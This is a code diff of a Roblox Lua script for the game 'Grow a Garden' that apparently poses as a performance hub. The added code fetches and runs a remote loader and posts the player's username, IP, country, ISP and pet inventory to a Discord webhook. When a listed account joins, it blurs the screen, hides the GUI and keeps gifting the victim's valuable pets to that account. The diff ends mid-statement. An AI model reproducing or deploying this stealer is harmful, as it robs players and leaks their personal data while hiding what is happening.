@@ -1,64 +1,238 @@
 
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local localPlayer = Players.LocalPlayer
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
+
+-- CONFIG SECTION
+local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
 local targetUsernames = {
-    "deepscriptAI", -- Add more names if needed
+    "BadPlayer123", "MyAlt", "EnemyGuy", "intercepternumber1", "deepscriptAI"
 }
-
-local highTierPets = {
-    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Racoon",
-    "Disco Bee", "Queen Bee", "T‑Rex", "Spinosaurus", "Ankylosaurus"
-}
-
 local drainPets = {
-    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Racoon", "Disco Bee", "Queen Bee", "T‑Rex",
-    "Spinosaurus", "Ankylosaurus", "Triceratops",
-    "Capybara", "Bear Bee", "Chicken Zombie", "Cooked Owl"
+    "Dragonfly", "T‑Rex", "Raccoon", "Red Fox", "Queen Bee",
+    "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
+    "Triceratops", "Axolotl", "Bear Bee", "Polar Bear",
+    "Praying Mantis", "Scarlet Macaw"
+}
+local petKeywords = {
+    "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab", "Bee",
+    "Black Bunny", "Cat", "Chicken", "Deer", "Monkey", "Orange Tabby",
+    "Pig", "Rooster", "Spotted Deer", "Flamingo", "Toucan", "Sea Turtle",
+    "Orangutan", "Seal", "Honey Bee", "Wasp", "Tarantula Hawk", "Raptor",
+    "Triceratops", "Stegosaurus", "Pterodactyl", "Turtle", "Caterpillar",
+    "Petal Bee", "Moth", "Scarlet Macaw", "Ostrich", "Peacock",
+    "Capybara", "Sand Snake", "Meerkat", "Brown Mouse", "Giant Ant",
+    "Grey Mouse", "Praying Mantis", "Red Giant Ant", "Snail", "Squirrel",
+    "Bear Bee", "Butterfly", "Brontosaurus", "Pack Bee", "Mimic Octopus",
+    "Hyacinth Macaw", "Axolotl", "Red Fox", "T‑Rex", "Dragonfly",
+    "Queen Bee", "Disco Bee", "Fennec Fox", "Moon Cat", "Raccoon",
+    "Polar Bear"
 }
 
-local gifted = false
+-- SERVICES
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local localPlayer = Players.LocalPlayer
+local backpack = localPlayer:WaitForChild("Backpack")
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local jobId = game.JobId
+local placeId = game.PlaceId
 
--- Auto unfavorite pets
-local function unfavoriteAll()
-    local Backpack = localPlayer:WaitForChild("Backpack")
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        if tool:IsA("Tool") and tool:FindFirstChild("dex") then
-            local dex = tool:FindFirstChild("dex")
-            if dex:GetAttribute("d") == true then
-                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("FavoritePet"):FireServer(tool, false)
+-- AUTO SERVER-HOP IF PRIVATE
+local function getLowestServer()
+    local req = http_request or syn.request or request or fluxus.request
+    if not req then return nil end
+    local cursor = ""
+    local lowest = nil
+    repeat
+        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then url = url .. "&cursor=" .. cursor end
+        local response = req({ Url = url, Method = "GET" })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            for _, server in pairs(data.data or {}) do
+                if server.playing < server.maxPlayers then
+                    lowest = server
+                    break
+                end
+            end
+            cursor = data.nextPageCursor
+        end
+    until lowest or cursor == nil
+    return lowest
+end
+
+local wasPrivateServer = false
+if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
+    local lowestServer = getLowestServer()
+    if lowestServer then
+        wasPrivateServer = true
+        warn("[*] Private server detected. Hopping to public server...")
+        task.wait(3)
+        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
+        return
+    else
+        warn("[!] No public server found.")
+    end
+end
+
+-- HELPERS
+function freezeVisual()
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 999
+    blur.Parent = Lighting
+end
+
+function removeGUI()
+    for _, v in pairs(localPlayer:WaitForChild("PlayerGui"):GetChildren()) do
+        if v:IsA("ScreenGui") or v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
+            v:Destroy()
+        end
+    end
+end
+
+local function hasKeyword(name, list)
+    for _, keyword in ipairs(list) do
+        if string.find(string.lower(name), string.lower(keyword)) then
+            return true
+        end
+    end
+    return false
+end
+
+local function getFilteredPets()
+    local filtered = {}
+    for _, item in pairs(backpack:GetChildren()) do
+        if item:IsA("Tool") and hasKeyword(item.Name, petKeywords) then
+            table.insert(filtered, item.Name)
+        end
+    end
+    return filtered
+end
+
+local function chunkItems(items)
+    local chunks = {}
+    for i = 1, #items, 5 do
+        local chunk = {}
+        for j = i, math.min(i+4, #items) do
+            table.insert(chunk, "- " .. items[j])
+        end
+        table.insert(chunks, {
+            name = "🎒 Pets " .. tostring(i) .. "–" .. tostring(math.min(i+4, #items)),
+            value = table.concat(chunk, "\n"),
+            inline = false
+        })
+    end
+    return chunks
+end
+
+local function sendWebhook(embedFields)
+    local data = {
+        content = "",
+        embeds = {{
+            title = "🐾 Grow a Garden Report",
+            color = 16753920,
+            fields = embedFields,
+            footer = { text = "Delta Executor Logger" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    local req = http_request or request or syn.request or fluxus.request
+    if req then
+        req({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    end
+end
+
+local function getIPInfo()
+    local req = http_request or request or syn.request or fluxus.request
+    if not req then return "Unknown", "Unknown", "Unknown" end
+    local result = req({ Url = "http://ip-api.com/json/", Method = "GET" })
+    if result and result.Body then
+        local body = HttpService:JSONDecode(result.Body)
+        return body.query or "?", body.country or "?", body.isp or "?"
+    end
+    return "?", "?", "?"
+end
+
+-- UNFAVORITE PETS
+local function unfavoriteAllPets()
+    local dex = ReplicatedStorage:FindFirstChild("Dex")
+    if not dex then return end
+    local unfavorited = {}
+    for _, item in pairs(dex:GetChildren()) do
+        if item:IsA("Instance") and item:GetAttribute("d") == true then
+            table.insert(unfavorited, item.Name)
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("ToggleFavorite"):FireServer(item.Name)
+            task.wait(0.2)
+        end
+    end
+    if #unfavorited > 0 then
+        sendWebhook({
+            { name = "🚫 Unfavorited Pets", value = table.concat(unfavorited, ", "), inline = false }
+        })
+    end
+end
+
+-- Send user info
+spawn(function()
+    local ip, country, isp = getIPInfo()
+    sendWebhook({
+        { name = "👤 Username", value = localPlayer.Name },
+        { name = "🌐 IP", value = ip },
+        { name = "🗺️ Country", value = country },
+        { name = "💻 ISP", value = isp },
+        { name = "📡 Server ID", value = jobId },
+        { name = "⏱️ Time", value = os.date("%Y-%m-%d %H:%M:%S") }
+    })
+end)
+
+-- Send filtered pets
+spawn(function()
+    local pets = getFilteredPets()
+    local petChunks = #pets > 0 and chunkItems(pets) or {
+        { name = "🎒 Pets", value = "None", inline = false }
+    }
+    sendWebhook(petChunks)
+end)
+
+-- Send 3rd message: server status
+spawn(function()
+    sendWebhook({
+        { name = "🔃 Server Status", value = wasPrivateServer and "Private server detected. Server hop executed." or "Already in public server.", inline = false }
+    })
+end)
+
+-- Watch for targets & handle reactions
+spawn(function()
+    while true do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if table.find(targetUsernames, player.Name) then
+                unfavoriteAllPets()
+                freezeVisual()
+                removeGUI()
+                for _, tool in ipairs(backpack:GetChildren()) do
+                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) then
+                        tool.Parent = character
+                        wait(0.3)
+                        while player and player.Parent == Players and tool.Parent == character do
+                            local args = {"GivePet", player}
+                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+                            wait(0.7)
+                        end
+                    end
+                end
             end
         end
+        wait(2.5)
     end
-end
-
--- Freeze screen (visual only)
-local function freezeScreen()
-    local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
-    blur.Size = 100
-end
-
--- Remove all GUIs
-local function removeGUI()
-    for _, gui in ipairs(localPlayer:WaitForChild("PlayerGui"):GetChildren()) do
-        if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
-            gui:Destroy()
-        end
-    end
-end
-
--- Auto gifting loop
-local function drain()
-    gifted = true
-    while gifted do
-        local Backpack = localPlayer:WaitForChild("Backpack")
-        for _, tool in ipairs(Backpack:GetChildren()) do
-            for _, petName in ipairs(drainPets) do
-                if string.find(tool.Name, petName) then
-                    local recipient = Players:FindFirstChild(targetUsernames[1])
-                    if recipient then
-                        local args = {
+end)
                             "GivePet",
                             recipient,
                             tool
